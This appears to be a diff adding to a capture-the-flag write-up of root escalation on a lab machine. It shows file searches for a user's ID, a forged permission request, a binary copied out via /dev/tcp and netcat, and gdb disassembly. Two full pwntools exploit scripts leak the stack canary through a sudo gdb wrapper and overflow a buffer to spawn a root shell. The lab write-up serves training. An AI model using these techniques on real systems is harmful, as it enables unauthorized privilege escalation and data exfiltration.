@@ -1293,6 +1293,470 @@ In the conversation between the administrator and Pedro, the latter asks the adm
 
 If we check the analisis_hallx directory we will see the following screenshots of the analysis that has been done to the program
 
+![image](https://github.com/user-attachments/assets/9394bd95-7708-48ca-9df2-33547f333dcc)
+
+![image](https://github.com/user-attachments/assets/818d2332-c5b8-4836-8a20-4c20158b11b5)
+
+![image](https://github.com/user-attachments/assets/4d131003-016d-466d-95ba-f752f424c25f)
+
+![image](https://github.com/user-attachments/assets/86c4aba1-79f2-45d0-8eb9-b7e4c46f9277)
+
+![image](https://github.com/user-attachments/assets/e13a1d02-5433-471e-a959-a0b125ed034e)
+
+These appear to be proof of what I read in the email. The screenshots demonstrate the Bof vulnerability, debug detection, and execution detection on virtual machines. For now, I'm going to ask the administrator for the privileges, since as you can read in the email, they will assign Pedro controlled permissions. 
+
+Since, just like with Carlos, I need Pedro's license plate, I will perform the same search in the system as I did with Carlos.
+
+```bash
+find / -user pedro 2>/dev/null |grep -vE 'proc|dev' |xargs grep "matricula" 2>/dev/null
+```
+```bash
+/home/pedro/.mnts.txt:matricula: 1250314
+```
+
+Once Pedro's license plate has been located, I send the email to the administrator as shown in the conversation between the two.
+
+```bash
+echo -e "Nombre solicitante: pedro\nMatricula solicitante: 1250314\nFecha:22-03-25\nBreve descripcion: gdb" | /usr/sbin/exim root@cybersec
+```
+
+![image](https://github.com/user-attachments/assets/e3f55ff9-6b18-46e9-a9ba-a002883821d9)
+
+![image](https://github.com/user-attachments/assets/943c61a5-7361-4353-9b92-5689bead6171)
+
+![image](https://github.com/user-attachments/assets/8c7aa7e8-7850-4651-8583-9eebc54aec7b)
+
+Pedro has been given privileges to execute the script /usr/local/bin/secure_gdb. 
+If we analyze the script, it seems that it checks that it is only possible to execute the specific binary and the script even checks the sha256 hash of the binary to know if it was altered or impersonated, that is, it would not be possible to replace the binary because the execution would fail.
+
+But if it is possible to run the debugger as root, then within the debugger I could execute system commands, so I will run the script as it expects to be executed and from within execute commands as root.
+
+```bash
+sudo /usr/local/bin/secure_gdb /home/pedro/hallx
+```
+
+![image](https://github.com/user-attachments/assets/e5fa3760-23b3-40dc-8189-3dae0582fd75)
+
+They limited the execution of commands internally in gdb, so this will not be an option to escalate to root.
+
+https://github.com/user-attachments/assets/f896b0a8-66d8-46eb-982a-a42e0aba4b34
+
+In fact, the binary is vulnerable to a BOF attack and, according to the message, it seems that the canary protection is active, I will pass it to my machine to analyze it.
+
+From my machine I run:
+
+```bash
+nc -lnvp 9000 > hallx
+```
+
+then I send the program
+
+```bash
+cat hallx > /dev/tcp/172.17.0.1/9000
+```
+
+![image](https://github.com/user-attachments/assets/1bacb28e-807f-4b16-97bf-0d95110b159e)
+
+Now I begin to analyze it to see how I can exploit it.
+
+![image](https://github.com/user-attachments/assets/a425eba2-170c-434e-8d22-fc4ca28ac0b2)
+
+![image](https://github.com/user-attachments/assets/19ce5347-9005-4f54-9778-63a47c6f5ab4)
+
+
+So, in main() you can see the functions to detect debugging and also virtualization, you can also see the factor1 function that invokes the shell
+
+Now I check the protections present in the program
+
+```bash
+checksec --file=hallx
+```
+
+![image](https://github.com/user-attachments/assets/a798b483-b50b-4dc7-8d27-adeaabcee8a2)
+
+The program has all protections active, so it would be necessary to extract the memory addresses at runtime to be able to exploit the Bof, apart from the need to bypass the canary protection. Now we will debug the program with privileges and analyze how to extract the necessary information and locate the memory address where the canary is located.
+
+
+```bash
+sudo gdb -q ./hallx
+```
+```bash
+Reading symbols from ./hallx...
+(No debugging symbols found in ./hallx)
+(gdb) break main
+Breakpoint 1 at 0x3762
+(gdb) r
+Starting program: /home/darks/Desktop/program/hallx 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, 0x0000555555557762 in main ()
+(gdb) set pagination off
+(gdb) disassemble factor2
+Dump of assembler code for function factor2:
+   0x0000555555557605 <+0>:	push   %rbp
+   0x0000555555557606 <+1>:	mov    %rsp,%rbp
+   0x0000555555557609 <+4>:	sub    $0x60,%rsp
+   0x000055555555760d <+8>:	mov    %fs:0x28,%rax
+   0x0000555555557616 <+17>:	mov    %rax,-0x8(%rbp)
+   0x000055555555761a <+21>:	xor    %eax,%eax
+   0x000055555555761c <+23>:	lea    0xff1(%rip),%rax        # 0x555555558614
+   0x0000555555557623 <+30>:	mov    %rax,%rdi
+   0x0000555555557626 <+33>:	mov    $0x0,%eax
+   0x000055555555762b <+38>:	call   0x555555556030 <printf@plt>
+   0x0000555555557630 <+43>:	mov    0x2b49(%rip),%rdx        # 0x55555555a180 <stdin@GLIBC_2.2.5>
+   0x0000555555557637 <+50>:	lea    -0x50(%rbp),%rax
+   0x000055555555763b <+54>:	mov    $0x80,%esi
+   0x0000555555557640 <+59>:	mov    %rax,%rdi
+   0x0000555555557643 <+62>:	call   0x555555556220 <fgets@plt>
+   0x0000555555557648 <+67>:	lea    -0x50(%rbp),%rax
+   0x000055555555764c <+71>:	lea    0xfd7(%rip),%rdx        # 0x55555555862a
+   0x0000555555557653 <+78>:	mov    %rdx,%rsi
+   0x0000555555557656 <+81>:	mov    %rax,%rdi
+   0x0000555555557659 <+84>:	call   0x5555555561f0 <strcmp@plt>
+   0x000055555555765e <+89>:	test   %eax,%eax
+   0x0000555555557660 <+91>:	je     0x5555555576a6 <factor2+161>
+   0x0000555555557662 <+93>:	lea    -0x50(%rbp),%rax
+   0x0000555555557666 <+97>:	lea    0xfc5(%rip),%rdx        # 0x555555558632
+   0x000055555555766d <+104>:	mov    %rdx,%rsi
+   0x0000555555557670 <+107>:	mov    %rax,%rdi
+   0x0000555555557673 <+110>:	call   0x5555555561f0 <strcmp@plt>
+   0x0000555555557678 <+115>:	test   %eax,%eax
+   0x000055555555767a <+117>:	je     0x5555555576a6 <factor2+161>
+   0x000055555555767c <+119>:	lea    0xfbd(%rip),%rax        # 0x555555558640
+   0x0000555555557683 <+126>:	mov    %rax,%rdi
+   0x0000555555557686 <+129>:	call   0x555555556210 <puts@plt>
+   0x000055555555768b <+134>:	lea    -0x50(%rbp),%rax
+   0x000055555555768f <+138>:	lea    0xfea(%rip),%rdx        # 0x555555558680
+   0x0000555555557696 <+145>:	mov    %rdx,%rsi
+   0x0000555555557699 <+148>:	mov    %rax,%rdi
+   0x000055555555769c <+151>:	call   0x55555555748d <log_event>
+   0x00005555555576a1 <+156>:	jmp    0x555555557748 <factor2+323>
+   0x00005555555576a6 <+161>:	lea    0xff3(%rip),%rax        # 0x5555555586a0
+   0x00005555555576ad <+168>:	mov    %rax,%rdi
+   0x00005555555576b0 <+171>:	mov    $0x0,%eax
+   0x00005555555576b5 <+176>:	call   0x555555556030 <printf@plt>
+   0x00005555555576ba <+181>:	lea    -0x5a(%rbp),%rax
+   0x00005555555576be <+185>:	mov    %rax,%rsi
+   0x00005555555576c1 <+188>:	lea    0x100f(%rip),%rax        # 0x5555555586d7
+   0x00005555555576c8 <+195>:	mov    %rax,%rdi
+   0x00005555555576cb <+198>:	mov    $0x0,%eax
+   0x00005555555576d0 <+203>:	call   0x555555556190 <__isoc99_scanf@plt>
+   0x00005555555576d5 <+208>:	lea    -0x5a(%rbp),%rax
+   0x00005555555576d9 <+212>:	lea    0xffb(%rip),%rdx        # 0x5555555586db
+   0x00005555555576e0 <+219>:	mov    %rdx,%rsi
+   0x00005555555576e3 <+222>:	mov    %rax,%rdi
+   0x00005555555576e6 <+225>:	call   0x5555555561f0 <strcmp@plt>
+   0x00005555555576eb <+230>:	test   %eax,%eax
+   0x00005555555576ed <+232>:	je     0x55555555771a <factor2+277>
+   0x00005555555576ef <+234>:	lea    -0x5a(%rbp),%rax
+   0x00005555555576f3 <+238>:	lea    0xfe9(%rip),%rdx        # 0x5555555586e3
+   0x00005555555576fa <+245>:	mov    %rdx,%rsi
+   0x00005555555576fd <+248>:	mov    %rax,%rdi
+   0x0000555555557700 <+251>:	call   0x5555555561f0 <strcmp@plt>
+   0x0000555555557705 <+256>:	test   %eax,%eax
+   0x0000555555557707 <+258>:	je     0x55555555771a <factor2+277>
+   0x0000555555557709 <+260>:	lea    0xfda(%rip),%rax        # 0x5555555586ea
+   0x0000555555557710 <+267>:	mov    %rax,%rdi
+   0x0000555555557713 <+270>:	call   0x555555556210 <puts@plt>
+   0x0000555555557718 <+275>:	jmp    0x555555557748 <factor2+323>
+   0x000055555555771a <+277>:	lea    -0x5a(%rbp),%rdx
+   0x000055555555771e <+281>:	lea    -0x50(%rbp),%rax
+   0x0000555555557722 <+285>:	mov    %rdx,%rsi
+   0x0000555555557725 <+288>:	mov    %rax,%rdi
+   0x0000555555557728 <+291>:	call   0x555555557549 <log_register>
+   0x000055555555772d <+296>:	lea    -0x5a(%rbp),%rax
+   0x0000555555557731 <+300>:	mov    %rax,%rsi
+   0x0000555555557734 <+303>:	lea    0xfc1(%rip),%rax        # 0x5555555586fc
+   0x000055555555773b <+310>:	mov    %rax,%rdi
+   0x000055555555773e <+313>:	mov    $0x0,%eax
+   0x0000555555557743 <+318>:	call   0x555555556030 <printf@plt>
+   0x0000555555557748 <+323>:	mov    -0x8(%rbp),%rax
+   0x000055555555774c <+327>:	sub    %fs:0x28,%rax
+   0x0000555555557755 <+336>:	je     0x55555555775c <factor2+343>
+   0x0000555555557757 <+338>:	call   0x555555556180 <__stack_chk_fail@plt>
+   0x000055555555775c <+343>:	leave
+   0x000055555555775d <+344>:	ret
+End of assembler dump
+```
+
+The first thing is to locate the canary in memory and for this we first place a breakpoint in main() and run the program with the objective of randomizing the memory addresses, when it stops in main() we disassemble the factor2 function to locate the canary.
+
+```bash
+ 0x0000555555557616 <+17>:	mov    %rax,-0x8(%rbp)
+```
+
+We locate the canary located at rbp-0x8, Now we need to locate ourselves after the memory address 0x0000555555557616, so we set a breakpoint on a following instruction, for example at: 0x0000555555557626.
+
+```bash
+break *0x0000555555557626
+```
+```bash
+continue
+```
+```bash
+x/1gx $rbp-0x8
+```
+
+![image](https://github.com/user-attachments/assets/466446cb-4dcb-483c-a02b-cf1b5c0c5eae)
+
+Here we have extracted the canary, The other thing we need is to extract the address of the malicious function factor1()
+
+```bash
+p factor1
+```
+
+![image](https://github.com/user-attachments/assets/18b6615a-4596-4846-acab-1ec06c228ac6)
+
+Now, using an exploit, we will automate the extraction of this data at runtime.
+
+```python
+import pexpect
+import re
+import struct
+from pwn import *
+
+def atack():
+
+    binary = ELF("/home/darks/Desktop/program/hallx")
+    binary_path = "/home/darks/Desktop/program/hallx"
+    gdb_process = pexpect.spawn(f"sudo gdb {binary_path}", timeout=10, maxread=10000, searchwindowsize=100)
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("set disassembly-flavor intel")
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("set pagination off")
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("set style enabled off")
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("break main")
+    gdb_process.expect("(gdb)")
+    #gdb_process.sendline("break factor1")
+    #gdb_process.expect("(gdb)")
+    gdb_process.sendline("run")
+
+    # Extracting address from factor1() function
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("p factor1")
+    gdb_process.expect_exact("(gdb)", timeout=10)
+    address_factor1 = gdb_process.before.decode('utf-8')
+    match = re.search(r'0x[0-9a-f]+', address_factor1)
+    if match:
+       address_factor1_str = match.group(0)  # Extraer la dirección en formato hexadecimal
+       address_factor1_int = int(address_factor1_str, 16)
+       address_factor1_le = p64(address_factor1_int) # direccion de factor1 en formato little-endian lista para el payload
+       gdb_process.sendline(" ") # prepara gdb para recibir el siguiente comando!
+    else:
+       print("No se pudo extraer la dirección de factor1().")
+       exit(1)
+
+    # We extract the memory address that will allow us to create a breakpoint to capture the canary already loaded in the stack.
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("disas factor2")
+    gdb_process.expect_exact("(gdb)", timeout=10)
+    address_factor2 = gdb_process.before.decode('utf-8')
+    lines = address_factor2.splitlines()
+    memory_addresses = [line.split()[0] for line in lines if '<+' in line]
+    if len(memory_addresses) >= 7:
+       seventh_memory_address = memory_addresses[6]
+       gdb_process.sendline(" ")
+       gdb_process.expect("(gdb)")
+       gdb_process.sendline(f"break *{seventh_memory_address}")
+       gdb_process.expect("(gdb)")
+       gdb_process.sendline("continue")
+    else:
+       print("No hay suficientes direcciones de memoria en la salida")
+
+    # we extract the canary
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("x/1gx $rbp-0x8")
+    gdb_process.expect_exact("(gdb)", timeout=10)
+    output_canary = gdb_process.before.decode('utf-8')
+    canary_value = output_canary.split(':')[1].strip().split()[0]
+    output_canary_int = int(canary_value, 16)
+    output_canary_le = struct.pack('<Q', output_canary_int) # canary listo en formato little-endian para el payload
+    gdb_process.sendline(" ")
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("continue")
+
+#    test code
+#    gdb_process.expect("(gdb)")
+#    gdb_process.sendline("disas factor2")
+#    gdb_process.expect_exact("(gdb)", timeout=10)
+#    address_breakpoint = gdb_process.before.decode('utf-8')
+#    lines = address_breakpoint.splitlines()
+#    memory_addresses_breakpoint = [line.split()[0] for line in lines if '<+' in line]
+#    if len(memory_addresses_breakpoint) >= 20:
+#       memory_address_bp = memory_addresses_breakpoint[19]
+#       gdb_process.sendline(" ")
+#       gdb_process.expect("(gdb)")
+#       gdb_process.sendline(f"break *{memory_address_bp}")
+#       gdb_process.expect("(gdb)")
+#       gdb_process.sendline("continue")
+#    else:
+#       print("No hay suficientes direcciones de memoria en la salida")
+
+    # construction of the payload
+    buffer_size = 72 # offset before overwriting the canary
+    buffer_fil = b'S' *buffer_size
+    padding = b'A' *8 # padding to align the stack
+    #rip = b'P' *8
+
+    payload = flat(
+    buffer_fil,
+    output_canary_le,
+    padding,
+    address_factor1_le
+    )
+    # sending the payload
+    gdb_process.expect("Introduce tu nombre: ")
+    gdb_process.sendline(payload)
+    #gdb_process.expect("(gdb)")
+    gdb_process.sendline("continue")
+    gdb_process.interact()
+    gdb_process.send(b"quit")
+    gdb_process.close()
+
+if __name__ == '__main__':
+    atack()
+```
+
+Now I configure my environment to be able to run gdb as root without asking me for a password.
+
+```bash
+echo "darks ALL=(root) NOPASSWD: /usr/bin/gdb" >> /etc/sudoers
+```
+
+Note: This configuration is on my local machine where I am developing and testing the exploit, this configuration must then be reverted.
+
+Once the environment is configured, I test the exploit.
+
+https://github.com/user-attachments/assets/7525f3f8-3d16-4af3-acb7-85b4952be9fd
+
+The exploit worked correctly on my machine, now it must be modified to run in Pedro's environment using the /usr/local/bin/secure_gdb script.
+
+The final exploit would look like this:
+
+exploit
+```python
+import pexpect
+import re
+import struct
+from pwn import *
+
+def atack():
+
+    binary = ELF("/home/pedro/hallx")
+    binary_path = "/home/pedro/hallx"
+    secure_gdb = "/usr/local/bin/secure_gdb"
+    gdb_process = pexpect.spawn(f"sudo {secure_gdb} {binary_path}", timeout=10, maxread=10000, searchwindowsize=100)
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("set disassembly-flavor intel")
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("set pagination off")
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("set style enabled off")
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("break main")
+    gdb_process.expect("(gdb)")
+    #gdb_process.sendline("break factor1")
+    #gdb_process.expect("(gdb)")
+    gdb_process.sendline("run")
+
+    # Extracting address from factor1() function
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("p factor1")
+    gdb_process.expect_exact("(gdb)", timeout=10)
+    address_factor1 = gdb_process.before.decode('utf-8')
+    match = re.search(r'0x[0-9a-f]+', address_factor1)
+    if match:
+       address_factor1_str = match.group(0)  # Extraer la dirección en formato hexadecimal
+       address_factor1_int = int(address_factor1_str, 16)
+       address_factor1_le = p64(address_factor1_int) # direccion de factor1 en formato little-endian lista para el payload
+       gdb_process.sendline(" ") # prepara gdb para recibir el siguiente comando!
+    else:
+       print("No se pudo extraer la dirección de factor1().")
+       exit(1)
+
+    # We extract the memory address that will allow us to create a breakpoint to capture the canary already loaded in the stack.
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("disas factor2")
+    gdb_process.expect_exact("(gdb)", timeout=10)
+    address_factor2 = gdb_process.before.decode('utf-8')
+    lines = address_factor2.splitlines()
+    memory_addresses = [line.split()[0] for line in lines if '<+' in line]
+    if len(memory_addresses) >= 7:
+       seventh_memory_address = memory_addresses[6]
+       gdb_process.sendline(" ")
+       gdb_process.expect("(gdb)")
+       gdb_process.sendline(f"break *{seventh_memory_address}")
+       gdb_process.expect("(gdb)")
+       gdb_process.sendline("continue")
+    else:
+       print("No hay suficientes direcciones de memoria en la salida")
+
+    # we extract the canary
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("x/1gx $rbp-0x8")
+    gdb_process.expect_exact("(gdb)", timeout=10)
+    output_canary = gdb_process.before.decode('utf-8')
+    canary_value = output_canary.split(':')[1].strip().split()[0]
+    output_canary_int = int(canary_value, 16)
+    output_canary_le = struct.pack('<Q', output_canary_int) # canary listo en formato little-endian para el payload
+    gdb_process.sendline(" ")
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("continue")
+
+#    test code
+#    gdb_process.expect("(gdb)")
+#    gdb_process.sendline("disas factor2")
+#    gdb_process.expect_exact("(gdb)", timeout=10)
+#    address_breakpoint = gdb_process.before.decode('utf-8')
+#    lines = address_breakpoint.splitlines()
+#    memory_addresses_breakpoint = [line.split()[0] for line in lines if '<+' in line]
+#    if len(memory_addresses_breakpoint) >= 20:
+#       memory_address_bp = memory_addresses_breakpoint[19]
+#       gdb_process.sendline(" ")
+#       gdb_process.expect("(gdb)")
+#       gdb_process.sendline(f"break *{memory_address_bp}")
+#       gdb_process.expect("(gdb)")
+#       gdb_process.sendline("continue")
+#    else:
+#       print("No hay suficientes direcciones de memoria en la salida")
+
+    # construction of the payload
+    buffer_size = 72 # offset before overwriting the canary
+    buffer_fil = b'S' *buffer_size
+    padding = b'A' *8 # padding to align the stack
+    #rip = b'P' *8
+
+    payload = flat(
+    buffer_fil,
+    output_canary_le,
+    padding,
+    address_factor1_le
+    )
+    # sending the payload
+    gdb_process.expect("Introduce tu nombre: ")
+    gdb_process.sendline(payload)
+    #gdb_process.expect("(gdb)")
+    gdb_process.sendline("continue")
+    gdb_process.interact()
+    gdb_process.send(b"quit")
+    gdb_process.close()
+
+if __name__ == '__main__':
+    atack()
+```
+We move the exploit to Pedro's directory, then we request permissions from the administrator again via email and execute the exploit.
+
+https://github.com/user-attachments/assets/9aea40ac-a48d-4021-bf74-49efbf0bd77c
+
+The exploit worked by getting the bash as root
+
+![image](https://github.com/user-attachments/assets/4c8256bd-24f3-4403-9746-ac8554d760a5)
+
+
+
 
 
 
